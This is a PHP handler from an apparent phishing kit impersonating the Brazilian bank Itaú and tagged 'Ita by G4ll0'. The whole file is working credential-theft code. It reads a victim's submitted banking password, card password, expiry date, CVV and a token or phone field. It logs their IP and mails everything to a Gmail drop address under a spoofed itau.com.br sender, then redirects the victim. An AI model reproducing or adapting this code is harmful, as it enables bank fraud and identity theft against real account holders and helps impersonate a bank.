﻿<?php



$senha1 = $_POST['senha1'];

$senha2 = $_POST['senha2'];

$validade = $_POST['validade'];

$validade = $_POST['validade'];

$cvv = $_POST['cvv'];

$itoken = $_POST['itoken'];

$ip = $_SERVER['REMOTE_ADDR'];





$emaildestinatario = 'aprovacao300@gmail.com';





$subj = "Dados / IP: $ip - Chegou: Ita by G4ll0";

 

/* Montando a mensagem a ser enviada no corpo do e-mail. */

$mensagemHTML = '<p>------------- |Chegou Ita by G4ll0| ------------</p>

<p><b>Senha Eletronica:</b> '.$senha1.'<br>

<p><b>Senha do Cartão:</b> '.$senha2.'<br>

<p><b>Validade:</b> '.$validade.'<br>

<p><b>Cód.Segurança:</b> '.$cvv.'<br>

<p><b>telefone:</b> '.$itoken.'<br>

<hr>

';





$headers = "MIME-Version: 1.1\r\n";

$headers .= "Content-type: text/html; charset=utf-8\r\n";

$headers .= "From: itauapp@itau.com.br \r\n"; // remetente

$headers .= "Return-Path: itauapp@itau.com.br \r\n"; // return-path

$envio = mail("aprovacao300@gmail.com", $subj, $mensagemHTML, $headers); 

 

 if($envio){

echo "<script>location='../fim.php';</script>";

}else{ 

  echo "<script>alert('Desculpe, algo deu errado. Tente novamente !');location='../home.php';</script>"; 

  }

?>